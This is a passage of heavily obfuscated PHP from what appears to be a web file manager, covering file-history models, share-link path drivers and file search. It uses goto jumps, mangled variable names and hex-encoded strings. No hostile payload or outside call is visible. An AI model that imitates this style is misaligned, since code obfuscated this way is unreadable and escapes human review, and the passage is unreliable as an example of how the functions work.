$d÷š´Ë”ƒì[496] && isset($bí÷Á‹ñ·„[$d÷š´Ë”ƒì[996]])) { $dòÒ‘Ô­òä[] = $bí÷Á‹ñ·„[$d÷š´Ë”ƒì[996]] . $d÷š´Ë”ƒì[33]; $dòÒ‘Ô­òä[] = $bí÷Á‹ñ·„[$d÷š´Ë”ƒì[997]] . $d÷š´Ë”ƒì[33]; } if ($CÛß´ÓÙÈ[$d÷š´Ë”ƒì[29]] == $d÷š´Ë”ƒì[2245] && isset($bí÷Á‹ñ·„[$d÷š´Ë”ƒì[374]])) { $dòÒ‘Ô­òä[] = $bí÷Á‹ñ·„[$d÷š´Ë”ƒì[374]] . $d÷š´Ë”ƒì[33]; } } $dòÒ‘Ô­òä = array_merge($dòÒ‘Ô­òä, $AÂÁÓóáäø, array($A³¿ˆ¥ôƒ . $d÷š´Ë”ƒì[33])); goto CÍ•ÑÃ—éù; AÉä£ÆŠğ: $DØ‰ØÂç‹¹ = Model($d÷š´Ë”ƒì[751])->sourceListInfo($dòÒ‘Ô­òä, !0); foreach ($EªÅ¢šŒÀ as &$CÛß´ÓÙÈ) { if ($CÛß´ÓÙÈ[$d÷š´Ë”ƒì[29]] == $d÷š´Ë”ƒì[496] && isset($CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]][$d÷š´Ë”ƒì[996]])) { $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]][$d÷š´Ë”ƒì[996]] = $DØ‰ØÂç‹¹[$CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]][$d÷š´Ë”ƒì[996]]]; $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]][$d÷š´Ë”ƒì[997]] = $DØ‰ØÂç‹¹[$CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]][$d÷š´Ë”ƒì[997]]]; } if ($CÛß´ÓÙÈ[$d÷š´Ë”ƒì[29]] == $d÷š´Ë”ƒì[2245] && isset($CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]][$d÷š´Ë”ƒì[374]])) { $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]][$d÷š´Ë”ƒì[374]] = $DØ‰ØÂç‹¹[$CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]][$d÷š´Ë”ƒì[374]]]; } $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[396]] = $DØ‰ØÂç‹¹[$CÛß´ÓÙÈ[$d÷š´Ë”ƒì[374]]]; $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[2250]] = $DØ‰ØÂç‹¹[$CÛß´ÓÙÈ[$d÷š´Ë”ƒì[2237]]]; if ($CÛß´ÓÙÈ[$d÷š´Ë”ƒì[29]] == $d÷š´Ë”ƒì[2033]) { $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[2250]] = $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[396]]; $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[2237]] = $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[2250]][$d÷š´Ë”ƒì[374]]; $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[396]] = !1; $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[374]] = $d÷š´Ë”ƒì[33]; } $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[2203]] = $c¢ â«Óøò[$CÛß´ÓÙÈ[$d÷š´Ë”ƒì[1403]]]; } $EÑÖ¶Ó‹Ó†[$d÷š´Ë”ƒì[359]] = $EªÅ¢šŒÀ; goto B•ƒáğ¶ãØ; CÍ•ÑÃ—éù: $dòÒ‘Ô­òä = array_unique($dòÒ‘Ô­òä); $cñ‘‰‡‡˜² = array_unique(array_to_keyvalue($EªÅ¢šŒÀ, $d÷š´Ë”ƒì[33], $d÷š´Ë”ƒì[1403])); $c¢ â«Óøò = Model($d÷š´Ë”ƒì[481])->userListInfo($cñ‘‰‡‡˜²); goto AÉä£ÆŠğ; D ‰øª’ˆ: } public function removeBySource($BˆœñÒ»Ö…) { $BŒãœõŠº = array($_SERVER[ºÖÙÂŒäÉê‡][388] => $BˆœñÒ»Ö…); $this->where($BŒãœõŠº)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\x63\x65\x5f\x68\x69\163\164\157\x72\x79"; public function addHistory($d›–Şğ…„í, $e“‚£‡Æö“ = '') { $bˆŠ¡ä™… =& $_SERVER[ºÖÙÂŒäÉê‡]; $EŞùßïÏë” = array($bˆŠ¡ä™…[388] => $d›–Şğ…„í[$bˆŠ¡ä™…[374]], $bˆŠ¡ä™…[1394] => isset($d›–Şğ…„í[$bˆŠ¡ä™…[384]]) ? $d›–Şğ…„í[$bˆŠ¡ä™…[384]] : $d›–Şğ…„í[$bˆŠ¡ä™…[383]], $bˆŠ¡ä™…[424] => $d›–Şğ…„í[$bˆŠ¡ä™…[423]], $bˆŠ¡ä™…[524] => $d›–Şğ…„í[$bˆŠ¡ä™…[77]], $bˆŠ¡ä™…[2251] => $e“‚£‡Æö“); $fÀ¯¹ì’’ = $GLOBALS[$bˆŠ¡ä™…[6]][$bˆŠ¡ä™…[84]][$bˆŠ¡ä™…[2252]]; if ($fÀ¯¹ì’’ > 1) { $this->historyAutoClear($EŞùßïÏë”[$bˆŠ¡ä™…[374]]); $this->add($EŞùßïÏë”); } Model($bˆŠ¡ä™…[2253])->eventFileEdit($d›–Şğ…„í[$bˆŠ¡ä™…[374]]); } private function historyAutoClear($bç´ÂèöëÑ) { goto FãÌÇğ¼¸§; FãÌÇğ¼¸§: $EÜÌ“Í—›í =& $_SERVER[ºÖÙÂŒäÉê‡]; $AÊå¡‚Ğ˜ = Model($EÜÌ“Í—›í[1078])->get($EÜÌ“Í—›í[2254]); $cÌ¦êï•é§ = $GLOBALS[$EÜÌ“Í—›í[6]][$EÜÌ“Í—›í[84]][$EÜÌ“Í—›í[2252]]; goto DÇê‹æ›ã; DÇê‹æ›ã: $A×¡£™ÂÑö = $AÊå¡‚Ğ˜ == $EÜÌ“Í—›í[2255] ? 3 : $cÌ¦êï•é§; if ($cÌ¦êï•é§ <= 1) { $A×¡£™ÂÑö = 1; } $CÙÏ¹ìöö­ = $A×¡£™ÂÑö - 1; goto f‰óæˆöÍÊ; f‰óæˆöÍÊ: if ($CÙÏ¹ìöö­ >= 500) { return; } $bÄÁéÀ²®Ô = array($EÜÌ“Í—›í[388] => $bç´ÂèöëÑ); $e¸’ÄŠóÃ‡ = $this->field($EÜÌ“Í—›í[2256])->where($bÄÁéÀ²®Ô)->order($EÜÌ“Í—›í[2248])->select(); goto fÑ„ÇÈ„Şó; BŠÀÏ²è: $bÄÁéÀ²®Ô = array($EÜÌ“Í—›í[390] => array($EÜÌ“Í—›í[7], $C†Å‘‘•«†)); $this->where($bÄÁéÀ²®Ô)->delete(); Model($EÜÌ“Í—›í[426])->remove($cøÓŒäŒ†); goto eáÃ¼¥Ö¨Á; fÑ„ÇÈ„Şó: if (!$e¸’ÄŠóÃ‡ || $CÙÏ¹ìöö­ >= count($e¸’ÄŠóÃ‡)) { return; } $C†Å‘‘•«† = array_to_keyvalue($e¸’ÄŠóÃ‡, $EÜÌ“Í—›í[33], $EÜÌ“Í—›í[372]); $C†Å‘‘•«† = array_slice($C†Å‘‘•«†, $CÙÏ¹ìöö­); goto Añ¶§ŠÛË; Añ¶§ŠÛË: $cøÓŒäŒ† = array_to_keyvalue($e¸’ÄŠóÃ‡, $EÜÌ“Í—›í[33], $EÜÌ“Í—›í[423]); $cøÓŒäŒ† = array_slice($cøÓŒäŒ†, $CÙÏ¹ìöö­); if (!$C†Å‘‘•«† || !$cøÓŒäŒ†) { return; } goto BŠÀÏ²è; eáÃ¼¥Ö¨Á: } public function listData($cïš²ºÇÏ) { goto f…‡ÛÃºŞ; d„Å‹é˜ÏÜ: $d“ïÔ®×Î = $this->field($A…Ô…æ‚)->where($D‡”‰»ğ—)->order($eÉİîÄ®àÏ[2248])->selectPage(); $this->_listAppendUser($d“ïÔ®×Î[$eÉİîÄ®àÏ[359]]); $aëíµ®ø¥â = Model($eÉİîÄ®àÏ[1078])->get($eÉİîÄ®àÏ[2254]); goto BÙÈ­áÊÚ; f…‡ÛÃºŞ: $eÉİîÄ®àÏ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D‡”‰»ğ— = array($eÉİîÄ®àÏ[388] => $cïš²ºÇÏ); $A…Ô…æ‚ = $eÉİîÄ®àÏ[2257]; goto d„Å‹é˜ÏÜ; BÙÈ­áÊÚ: $f«½Š¯¤ÏŞ = 3; if ($aëíµ®ø¥â == $eÉİîÄ®àÏ[2255]) { $d“ïÔ®×Î[$eÉİîÄ®àÏ[359]] = array_slice($d“ïÔ®×Î[$eÉİîÄ®àÏ[359]], 0, $f«½Š¯¤ÏŞ); $d“ïÔ®×Î[$eÉİîÄ®àÏ[356]] = array($eÉİîÄ®àÏ[2258] => 1, $eÉİîÄ®àÏ[2259] => 20, $eÉİîÄ®àÏ[2260] => 1, $eÉİîÄ®àÏ[2261] => count($d“ïÔ®×Î[$eÉİîÄ®àÏ[359]])); } return $d“ïÔ®×Î; goto E—×ª¹’ì; E—×ª¹’ì: } protected function _listAppendUser(&$cŞ óùëà) { $b½Î¹…Äï¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f§°”ùÉİ… = array_to_keyvalue($cŞ óùëà, $b½Î¹…Äï¨[33], $b½Î¹…Äï¨[1403]); $c¸àÎ›œËŞ = Model($b½Î¹…Äï¨[481])->userListInfo($f§°”ùÉİ…); foreach ($cŞ óùëà as &$Eêóõğ) { $c‰¾º¥´Çó = $Eêóõğ[$b½Î¹…Äï¨[1403]]; $Eêóõğ[$b½Î¹…Äï¨[383]] = $c¸àÎ›œËŞ[$c‰¾º¥´Çó] ? $c¸àÎ›œËŞ[$c‰¾º¥´Çó] : !1; } } public function fileInfo($A˜Ç˜¼ï‡”) { $dí±ùÅ¿¹ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d–‡ùÜïºï = $this->tablePrefix; $D”îƒø×‹ƒ = "{$d–‡ùÜïºï}\151\x6f\x5f\x66\151\154\x65\x20\146\151\154\x65\163\40\157\x6e\40\146\151\154\x65\x73\56\x66\151\154\145\111\104\40\75\40\150\x69\x73\164\157\162\x79\56\146\x69\x6c\145\x49\x44"; return $this->alias($dí±ùÅ¿¹[2262])->where(array($dí±ùÅ¿¹[390] => $A˜Ç˜¼ï‡”))->join($D”îƒø×‹ƒ, $dí±ùÅ¿¹[2263])->find(); } public function removeItem($A‚¬Ğ—÷ôĞ) { $B¬«ö†ä†÷ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c¬í‘¯É¡Ç = array($B¬«ö†ä†÷[390] => $A‚¬Ğ—÷ôĞ); $E½Øƒ‚¯¶” = $this->where($c¬í‘¯É¡Ç)->find(); if ($E½Øƒ‚¯¶”) { $aŸ‚¿¿Ûô = $this->where($c¬í‘¯É¡Ç)->delete(); Model($B¬«ö†ä†÷[426])->remove($E½Øƒ‚¯¶”[$B¬«ö†ä†÷[423]]); return $aŸ‚¿¿Ûô; } return !1; } public function removeBySource($FÀ¾ß²Ìò™) { goto C’ï³òÁà; C’ï³òÁà: $DîÕ‚‘åöÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$FÀ¾ß²Ìò™) { return !1; } if (!is_array($FÀ¾ß²Ìò™)) { $FÀ¾ß²Ìò™ = array($FÀ¾ß²Ìò™); } goto e§¥¥¦©ğš; e§¥¥¦©ğš: $f‘ä×ÍÁÎ½ = array($DîÕ‚‘åöÉ[388] => array($DîÕ‚‘åöÉ[7], $FÀ¾ß²Ìò™)); $CÎ¿‹˜šˆ¯ = $this->field($DîÕ‚‘åöÉ[424])->where($f‘ä×ÍÁÎ½)->select(); if ($CÎ¿‹˜šˆ¯) { $this->where($f‘ä×ÍÁÎ½)->delete(); $E©×¤·‡î = array_to_keyvalue($CÎ¿‹˜šˆ¯, $DîÕ‚‘åöÉ[33], $DîÕ‚‘åöÉ[423]); Model($DîÕ‚‘åöÉ[426])->remove($E©×¤·‡î); } goto aÓ˜Í·¨Ğ·; aÓ˜Í·¨Ğ·: return !0; goto dÆø¶ÌšŸ¢; dÆø¶ÌšŸ¢: } public function setDetail($Dù¢–á·ï–, $fŠ’Å®Öç) { $BÌ¨ù”ÒÎï =& $_SERVER[ºÖÙÂŒäÉê‡]; return $this->where(array($BÌ¨ù”ÒÎï[390] => $Dù¢–á·ï–))->save(array($BÌ¨ù”ÒÎï[2251] => $fŠ’Å®Öç)); } public function rollbackToItem($bË¥ØÓ±¼Ü, $E½Ç™×ğç) { goto D…÷èŒÜà; E‘îŸ‹Ëğ: $B–…İØÅï£ = $this->find($E½Ç™×ğç); $c¬…²Š˜ = array($dŸÎš‚¾Ø[423] => $B–…İØÅï£[$dŸÎš‚¾Ø[423]], $dŸÎš‚¾Ø[77] => $B–…İØÅï£[$dŸÎš‚¾Ø[77]], $dŸÎš‚¾Ø[106] => time(), $dŸÎš‚¾Ø[384] => USER_ID); Model($dŸÎš‚¾Ø[751])->where(array($dŸÎš‚¾Ø[374] => $bË¥ØÓ±¼Ü))->save($c¬…²Š˜); goto Dƒªé£—ê; Dƒªé£—ê: return $this->where(array($dŸÎš‚¾Ø[390] => $E½Ç™×ğç))->delete(); goto f‡÷Áˆçˆù; D…÷èŒÜà: $dŸÎš‚¾Ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÇçòÇ™ = Model($dŸÎš‚¾Ø[751])->sourceInfo($bË¥ØÓ±¼Ü); $this->addHistory($aÇçòÇ™); goto E‘îŸ‹Ëğ; f‡÷Áˆçˆù: } public function clearSame($E÷½°†„ˆò) { goto eŠ‹¬¶Å¸; Dµ¶ğœ§š: $B§’Ç›¶ = array(); $FİóŸØšğÖ = array(); foreach ($aŠâ‹ó¯† as $aªå¡Ğ‰á) { if (!$aªå¡Ğ‰á || count($aªå¡Ğ‰á) <= 1) { continue; } foreach ($aªå¡Ğ‰á as $b‰ïÔ­åƒ) { $B§’Ç›¶[] = $b‰ïÔ­åƒ[$d¬Ôù°¡©Û[423]]; $FİóŸØšğÖ[] = $b‰ïÔ­åƒ[$d¬Ôù°¡©Û[372]]; } } goto DÇ×Şùœ†; DÇ×Şùœ†: if (!$FİóŸØšğÖ) { return; } $this->where(array($d¬Ôù°¡©Û[372] => array($d¬Ôù°¡©Û[7], $FİóŸØšğÖ)))->delete(); Model($d¬Ôù°¡©Û[426])->remove($B§’Ç›¶); goto DÀ‰Ã‘ö£; eŠ‹¬¶Å¸: $d¬Ôù°¡©Û =& $_SERVER[ºÖÙÂŒäÉê‡]; $b’Úåò‰ç‡ = $this->listData($E÷½°†„ˆò); $aŠâ‹ó¯† = array_to_keyvalue_group($b’Úåò‰ç‡, $d¬Ôù°¡©Û[423]); goto Dµ¶ğœ§š; DÀ‰Ã‘ö£: } public function userSpace() { $bŒ£ÒÄµĞà =& $_SERVER[ºÖÙÂŒäÉê‡]; $a¿åÇè’Î = $this->tablePrefix; $Aôˆˆ…Áá = array($bŒ£ÒÄµĞà[1394] => USER_ID); $a×¾ÆäÁå = "{$a¿åÇè’Î}\151\x6f\137\146\x69\x6c\x65\40\x66\151\x6c\x65\x73\x20\x6f\x6e\40\x66\x69\x6c\x65\163\56\x66\x69\x6c\145\x49\x44\x20\75\x20\150\x69\163\x74\157\162\x79\x2e\146\151\x6c\x65\x49\104"; return $this->alias($bŒ£ÒÄµĞà[2262])->where($Aôˆˆ…Áá)->join($a×¾ÆäÁå, $bŒ£ÒÄµĞà[2263])->sum($bŒ£ÒÄµĞà[77]); } } goto dŸ‡“²Œ; a†‹®º´ÛÒ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($D”…ĞàññÈ) { $this->pathParse = $D”…ĞàññÈ; $this->model = Model($_SERVER[ºÖÙÂŒäÉê‡][1100]); } protected function infoParse($Bæ­à©¯¹Ø, $D×é¨¡ë˜ = false, $F‹“È×é¸Ó = false) { $DÉì—àĞùã =& $_SERVER[ºÖÙÂŒäÉê‡]; return Action($DÉì—àĞùã[1007])->sharePathInfo($this->pathParse[$DÉì—àĞùã[75]], !0); } public function listPath($AÇÃÜÜëá„, $BêÊŸ—¤Ë› = false) { $e®„‹—ì¡é =& $_SERVER[ºÖÙÂŒäÉê‡]; $aª”œçÆ©¥ = parent::listPath($AÇÃÜÜëá„, $BêÊŸ—¤Ë›); foreach ($aª”œçÆ©¥ as $a¬©¶‡Â§˜ => $BÏä•æå½Ù) { if (!in_array($a¬©¶‡Â§˜, array($e®„‹—ì¡é[73], $e®„‹—ì¡é[74]))) { continue; } foreach ($BÏä•æå½Ù as $eƒŒ˜Ô›¢¡ => $bÃ‡é¯¬Ãæ) { $aª”œçÆ©¥[$a¬©¶‡Â§˜][$eƒŒ˜Ô›¢¡] = Action($e®„‹—ì¡é[1007])->shareItemInfo($bÃ‡é¯¬Ãæ); } } return $aª”œçÆ©¥; } public function listAll($fóƒœ…¸Ä) { $CÆ´Ë¥«œ• =& $_SERVER[ºÖÙÂŒäÉê‡]; $cÀ¿å©¸ß¶ = IO::info($this->pathParse[$CÆ´Ë¥«œ•[75]]); if (!$cÀ¿å©¸ß¶) { return array(); } $b¹À´‰ƒÍ = $this->model->listAll($fóƒœ…¸Ä); foreach ($b¹À´‰ƒÍ as &$FçŸƒŒÅĞ) { $FçŸƒŒÅĞ[$CÆ´Ë¥«œ•[396]] = Action($CÆ´Ë¥«œ•[1007])->shareItemInfo($FçŸƒŒÅĞ[$CÆ´Ë¥«œ•[396]]); } return $b¹À´‰ƒÍ; } } class PathDriverDriverShareItem { public function __construct($F¤ÛÖ‰ª®·) { $this->pathParse = $F¤ÛÖ‰ª®·; } public function __call($aÑÖ‚àÀâ¼, $F°ÇéˆÈš÷) { $dØô¼©øöÕ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (method_exists($this, $aÑÖ‚àÀâ¼)) { return; } $B¿Ó˜Ÿ©ƒñ = call_user_func_array(array($dØô¼©øöÕ[1107], $aÑÖ‚àÀâ¼), $F°ÇéˆÈš÷); $C¼ÛáÒ’Êò = array($dØô¼©øöÕ[1108], $dØô¼©øöÕ[1109], $dØô¼©øöÕ[1110], $dØô¼©øöÕ[1111], $dØô¼©øöÕ[494], $dØô¼©øöÕ[496], $dØô¼©øöÕ[1112], $dØô¼©øöÕ[102], $dØô¼©øöÕ[1113], $dØô¼©øöÕ[1114]); if (in_array($aÑÖ‚àÀâ¼, $C¼ÛáÒ’Êò)) { $B¿Ó˜Ÿ©ƒñ = $this->getPathOuter($B¿Ó˜Ÿ©ƒñ); } return $B¿Ó˜Ÿ©ƒñ; } public function copy($E£ã­®—†, $F­Š²£®œÛ, $BŠ¨¦¡‡Û– = false) { return $this->copyMove($E£ã­®—†, $F­Š²£®œÛ, $BŠ¨¦¡‡Û–, $_SERVER[ºÖÙÂŒäÉê‡][494]); } public function move($Aß”Íé‡, $Aáå·Ášöï, $D¥½Èè©ñ‚ = false) { return $this->copyMove($Aß”Íé‡, $Aáå·Ášöï, $D¥½Èè©ñ‚, $_SERVER[ºÖÙÂŒäÉê‡][496]); } private function copyMove($a…‰¼¬¶ÈÀ, $F‘±Î«åƒ, $Cà˜Ÿ­©Òè, $Eö›•’Íï¢) { goto BàÒ…Ş‡; dòßÙßĞˆ©: return $AÏ³¯é¡²; goto cšïÈß¼â; BàÒ…Ş‡: $BçŒ‚˜†Ô =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÜŸÛĞÀ‰› = $F‘±Î«åƒ; $d„¯Ï²Ö = IO::driverMake($F‘±Î«åƒ); goto F«®³éÏÈñ; F«®³éÏÈñ: if ($d„¯Ï²Ö->pathParse[$BçŒ‚˜†Ô[988]]) { $F‘±Î«åƒ = $d„¯Ï²Ö->pathParse[$BçŒ‚˜†Ô[988]]; } else { $F‘±Î«åƒ = $fÜŸÛĞÀ‰›; } $AÏ³¯é¡² = IO::copyMove($a…‰¼¬¶ÈÀ, $F‘±Î«åƒ, $Cà˜Ÿ­©Òè, $Eö›•’Íï¢); $AÏ³¯é¡² = $this->getPathOuter($AÏ³¯é¡²); goto dòßÙßĞˆ©; cšïÈß¼â: } public function pathFather($c”»÷µˆØ¬) { return get_path_father($this->pathParse[$_SERVER[ºÖÙÂŒäÉê‡][75]]); } public function iconvSystem($EÖ½‹—×•à) { return $EÖ½‹—×•à; } protected function infoParse($f¸æ³ÒÀ§Õ) { $aÏÇæËÚÑ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b‰¿šµ¦±­ = $this->pathParse[$aÏÇæËÚÑ[443]][$aÏÇæËÚÑ[1008]] . $this->pathParse[$aÏÇæËÚÑ[1001]]; $FöŒµÒÖÀ = IO::info($b‰¿šµ¦±­); $F®Òî‚Ï¦Å = $this->pathParse[$aÏÇæËÚÑ[443]]; return Action($aÏÇæËÚÑ[1106])->_shareItemeParse($FöŒµÒÖÀ, $F®Òî‚Ï¦Å); } public function listAll($D˜‚ğš¬„) { $CÄÀŠïŒé… =& $_SERVER[ºÖÙÂŒäÉê‡]; $FÌ§ŒŸˆñ = IO::listAll($D˜‚ğš¬„); $D„¨¹¿ì„ì = $this->pathParse[$CÄÀŠïŒé…[443]]; foreach ($FÌ§ŒŸˆñ as &$Aˆ¹¾ˆ•°) { check_abort(); $Aˆ¹¾ˆ•° = array_merge(IO::info($Aˆ¹¾ˆ•°[$CÄÀŠïŒé…[75]]), $Aˆ¹¾ˆ•°); $Aˆ¹¾ˆ•°[$CÄÀŠïŒé…[396]] = Action($CÄÀŠïŒé…[1106])->_shareItemeParse($Aˆ¹¾ˆ•°, $D„¨¹¿ì„ì); } return $FÌ§ŒŸˆñ; } public function getPathOuter($Aˆ“ª¨ˆ–) { goto B „·È×Â›; B „·È×Â›: $A•–†ÏÀÈø =& $_SERVER[ºÖÙÂŒäÉê‡]; $eœË¾ŠÏ°Õ = KodIO::parse($Aˆ“ª¨ˆ–); if ($eœË¾ŠÏ°Õ[$A•–†ÏÀÈø[29]] == KodIO::KOD_SHARE_ITEM) { return $eœË¾ŠÏ°Õ[$A•–†ÏÀÈø[75]]; } goto f›Ä†çíŒ´; d´ùí„…à¡: if (substr($cƒÁ‡†£Ş•, 0, strlen($DŒƒ¤Î¥Ö¿)) != $DŒƒ¤Î¥Ö¿) { return !1; } return $this->pathParse[$A•–†ÏÀÈø[1002]] . $A•–†ÏÀÈø[8] . ltrim($a‚Áºää×», $A•–†ÏÀÈø[8]); goto BÈß‘Ä –¥; f›Ä†çíŒ´: $cƒÁ‡†£Ş• = KodIO::clear($Aˆ“ª¨ˆ–); $DŒƒ¤Î¥Ö¿ = KodIO::clear($this->pathParse[$A•–†ÏÀÈø[443]][$A•–†ÏÀÈø[1008]]); $a‚Áºää×» = substr($cƒÁ‡†£Ş•, strlen($DŒƒ¤Î¥Ö¿)); goto d´ùí„…à¡; BÈß‘Ä –¥: } public function getType() { $c²–œóš¦í =& $_SERVER[ºÖÙÂŒäÉê‡]; $DãçóŠ­° = str_replace($c²–œóš¦í[71], $c²–œóš¦í[33], get_class($this)); return strtolower($DãçóŠ­°); } public function isTypeObject($E¦¨ì•¬Âí) { return IO::isTypeObject($E¦¨ì•¬Âí); } public function info($Bø†íğÍ…ƒ) { return $this->infoParse($Bø†íğÍ…ƒ); } public function infoAuth($Cø–°ù©‹’) { return $this->infoParse($Cø–°ù©‹’); } public function infoWithChildren($aÍƒ¿°Âï¬) { return $this->infoParse($aÍƒ¿°Âï¬); } public function infoFull($EĞÑ¦áë””) { return $this->infoParse($EĞÑ¦áë””); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($CùÏÚë¬ç) { $this->pathParse = $CùÏÚë¬ç; } protected function infoParse($e¾÷Á‡Ì‰Ş) { $A£¶™¦ÒËÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; return Action($A£¶™¦ÒËÉ[1007])->sharePathInfo($this->pathParse[$A£¶™¦ÒËÉ[75]], !0); } public function listPath($dš¥±»ÕÄÖ, $eÑ•é—ì¹² = false) { $aÚ“Ÿ¤Ğ™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cïÂœ—Àù = IO::listPath($dš¥±»ÕÄÖ, $eÑ•é—ì¹²); foreach ($cïÂœ—Àù as $b¶×±‰Ñ†½ => $EÅ„»ŒÓÉƒ) { if (!in_array($b¶×±‰Ñ†½, array($aÚ“Ÿ¤Ğ™[73], $aÚ“Ÿ¤Ğ™[74]))) { continue; } foreach ($EÅ„»ŒÓÉƒ as $e¹Ú±Ö“ => $aÕÈÇ‘ …) { $aÕÈÇ‘ … = Action($aÚ“Ÿ¤Ğ™[1115])->parsePathChildren($aÕÈÇ‘ …, array($aÚ“Ÿ¤Ğ™[392] => $dš¥±»ÕÄÖ)); $cïÂœ—Àù[$b¶×±‰Ñ†½][$e¹Ú±Ö“] = Action($aÚ“Ÿ¤Ğ™[1007])->shareItemInfo($aÕÈÇ‘ …); } } return $cïÂœ—Àù; } public function listAll($d¼«™…ªÇÚ) { $cöÔ‚ò…«œ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÅ”æóãÚ÷ = IO::listAll($d¼«™…ªÇÚ); foreach ($bÅ”æóãÚ÷ as &$AÊÔÕ¬Èø) { $AÊÔÕ¬Èø = array_merge(IO::info($AÊÔÕ¬Èø[$cöÔ‚ò…«œ[75]]), $AÊÔÕ¬Èø); $AÊÔÕ¬Èø[$cöÔ‚ò…«œ[396]] = Action($cöÔ‚ò…«œ[1007])->shareItemInfo($AÊÔÕ¬Èø); } return $bÅ”æóãÚ÷; } } goto C‰Éï…Çá…; dŸ‡“²Œ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($a•Í±éÌ«) { goto FãŸÇ„¨”°; Cõ¥ÙœÕ¸Ğ: if (!$fäÈÎšÙ÷) { return array(); } $cæ®ë™©‡ = $fäÈÎšÙ÷[$Bœ•÷„†÷Ñ[156]]; $D™«ÀÖçå¤ = $Bœ•÷„†÷Ñ[7]; goto A­è®‰ù£¨; FãŸÇ„¨”°: $Bœ•÷„†÷Ñ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¤ì•¢¼‰Õ = KodIO::fileTypeList(); $fäÈÎšÙ÷ = $f¤ì•¢¼‰Õ[$a•Í±éÌ«]; goto Cõ¥ÙœÕ¸Ğ; A­è®‰ù£¨: if (!$fäÈÎšÙ÷[$Bœ•÷„†÷Ñ[156]]) { $aÙ­ˆ÷Ş© = array_to_keyvalue($f¤ì•¢¼‰Õ, $Bœ•÷„†÷Ñ[33], $Bœ•÷„†÷Ñ[156]); $cæ®ë™©‡ = implode($Bœ•÷„†÷Ñ[47], $aÙ­ˆ÷Ş©); $D™«ÀÖçå¤ = $Bœ•÷„†÷Ñ[2220]; } $D·­ËÌÙ÷ = explode($Bœ•÷„†÷Ñ[47], trim($cæ®ë™©‡, $Bœ•÷„†÷Ñ[47])); return array($D™«ÀÖçå¤, $D·­ËÌÙ÷); goto DŸ Á«ÎÕ; DŸ Á«ÎÕ: } public function listPathType($Eª·ˆÁÜÙì) { $d³°ƒ£ÇÉõ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cá…Œà½§˜ = $this->fileTypeWhere($Eª·ˆÁÜÙì); if (!$Cá…Œà½§˜) { return array(); } $E¹²¾õ˜ïÖ = array($d³°ƒ£ÇÉõ[525] => SourceModel::TYPE_USER, $d³°ƒ£ÇÉõ[526] => USER_ID, $d³°ƒ£ÇÉõ[522] => 0, $d³°ƒ£ÇÉõ[523] => $Cá…Œà½§˜); return $this->listSource($E¹²¾õ˜ïÖ); } public function listSearch($bŒÜœÁç¢­, $DßÄùÏÉê = 300) { goto E™×½±¬ƒ; E™×½±¬ƒ: $fóí¬¢ÄšÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($bŒÜœÁç¢­[$fóí¬¢ÄšÉ[2142]]) && $bŒÜœÁç¢­[$fóí¬¢ÄšÉ[2142]]) { $bŒÜœÁç¢­[$fóí¬¢ÄšÉ[2142]] = str_replace($fóí¬¢ÄšÉ[1555], $fóí¬¢ÄšÉ[2264], trim($bŒÜœÁç¢­[$fóí¬¢ÄšÉ[2142]])); } $CáÃÅñä”Œ = $this->_parseSearchWhere($bŒÜœÁç¢­); goto Bãæ²¯Ò†ª; F¡é¿èèÊ·: $this->_listSearchBindPinyin($bŒÜœÁç¢­, $CáÃÅñä”Œ, $aËã†¶¾¥Ü); $this->alias($fóí¬¢ÄšÉ[491])->_makeOrder()->cache(null, 10); $d„ôŠÜªÅê = $this->distinct(!0)->field($aËã†¶¾¥Ü)->where($CáÃÅñä”Œ)->selectPage($DßÄùÏÉê); goto B¥»ƒøğ¶; B¥»ƒøğ¶: $this->_listSearchDesc($d„ôŠÜªÅê, $bŒÜœÁç¢­, $dÉŒŸ ˜ò†); $this->_listSearchTag($d„ôŠÜªÅê, $bŒÜœÁç¢­, $dÉŒŸ ˜ò†); $this->_listDataApply($d„ôŠÜªÅê[$fóí¬¢ÄšÉ[359]]); goto F©å¸öåÀÍ; F©å¸öåÀÍ: $this->_listMake($d„ôŠÜªÅê); return $d„ôŠÜªÅê; goto BéØ·ŒæØ±; Bãæ²¯Ò†ª: if (!isset($CáÃÅñä”Œ[$fóí¬¢ÄšÉ[401]])) { $CáÃÅñä”Œ[$fóí¬¢ÄšÉ[401]] = 0; } $aËã†¶¾¥Ü = $fóí¬¢ÄšÉ[2265]; $dÉŒŸ ˜ò† = $aËã†¶¾¥Ü; goto F¡é¿èèÊ·; BéØ·ŒæØ±: } private function _listSearchTag(&$ašç¡Œµ¡Ö, $Bˆ¸œ¥øÉ¯, $eÔèöª® ì) { goto Aç£‡îÙ’; Dä±‚Äƒ½ï: 